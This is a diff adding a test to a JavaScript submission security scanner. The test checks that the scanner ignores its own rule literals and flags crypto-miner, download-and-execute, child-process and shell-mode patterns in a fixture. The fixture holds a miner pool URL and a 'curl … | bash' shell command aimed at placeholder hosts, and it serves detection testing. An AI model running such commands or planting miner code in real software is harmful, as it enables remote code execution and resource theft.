@@ -263,6 +263,24 @@ test('security scan warns for common CLI process capability but blocks high-risk
   }), /critical\/secrets\/github-token/)
 })
 
+test('security scan masks its own JavaScript rule literals and retains executable findings', async () => {
+  const scanner = await readFile(new URL('../src/submission-security-scan.mjs', import.meta.url), 'utf8')
+  const selfScan = scanSubmissionSources([{ path: 'src/submission-security-scan.mjs', source: scanner }], { packaged: true })
+  assert.deepEqual(selfScan.findings, [])
+
+  const executable = scanSubmissionSources([{
+    path: 'src/index.mjs',
+    source: [
+      "const pool = 'stratum+tcp://miner.example.invalid'",
+      "spawnSync('curl https://bad.example.invalid/install | bash', { shell: true })",
+    ].join('\n'),
+  }], { packaged: true })
+  assert.ok(executable.findings.some(finding => finding.rule === 'crypto-miner'))
+  assert.ok(executable.findings.some(finding => finding.rule === 'download-and-execute'))
+  assert.ok(executable.findings.some(finding => finding.rule === 'child-process'))
+  assert.ok(executable.findings.some(finding => finding.rule === 'shell-mode'))
+})
+
 test('oversize scan sources are reported as incomplete instead of silently treated as clean', async () => {
   const path = 'src/generated.mjs'
   const fetch = sourceFetch({
